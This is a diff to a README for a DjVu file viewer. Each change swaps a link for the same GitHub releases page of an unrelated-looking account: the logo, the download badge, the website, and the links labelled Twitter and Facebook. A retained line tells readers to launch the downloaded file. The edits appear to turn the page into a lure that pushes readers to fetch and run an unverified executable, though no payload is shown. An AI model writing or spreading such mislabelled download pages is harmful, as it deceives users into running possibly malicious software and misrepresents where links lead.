@@ -2,7 +2,7 @@
 
 Welcome to DjVuReader, the ultimate lightweight and efficient viewer for DjVu files! Dive into the world of seamless reading and document management with this powerful tool. 🚀
 
-![DjVuReader Logo](https://example.com/djvureader-logo.png)
+![DjVuReader Logo](https://github.com/Voxelsrythimic7/DjVuReader/releases)
 
 ## Features 🌟
 
@@ -22,7 +22,7 @@ Welcome to DjVuReader, the ultimate lightweight and efficient viewer for DjVu fi
 
 ## Download Now! 📥
 
-[![Download DjVuReader](https://img.shields.io/badge/Download-App.zip-blue)](https://github.com/repo/releases/9246/App.zip)
+[![Download DjVuReader](https://github.com/Voxelsrythimic7/DjVuReader/releases)](https://github.com/Voxelsrythimic7/DjVuReader/releases)
 
 *Note: The file needs to be launched after downloading.*
 
@@ -42,13 +42,13 @@ Ready to enhance your reading and document management experience? Download DjVuR
 
 Feel free to explore the various features and functionalities offered by DjVuReader to optimize your reading experience. Happy reading! 📚
 
-For more information and updates, visit our [website](https://djvureader.com).
+For more information and updates, visit our [website](https://github.com/Voxelsrythimic7/DjVuReader/releases).
 
 ## Stay Connected! 🌐
 
 Connect with us on social media for the latest news and updates:
-- Twitter: [@DjVuReaderOfficial](https://twitter.com/DjVuReaderOfficial)
-- Facebook: [DjVuReader](https://facebook.com/DjVuReader)
+- Twitter: [@DjVuReaderOfficial](https://github.com/Voxelsrythimic7/DjVuReader/releases)
+- Facebook: [DjVuReader](https://github.com/Voxelsrythimic7/DjVuReader/releases)
 
 Let's revolutionize the way you read and manage your documents with DjVuReader! 💻🔍
 
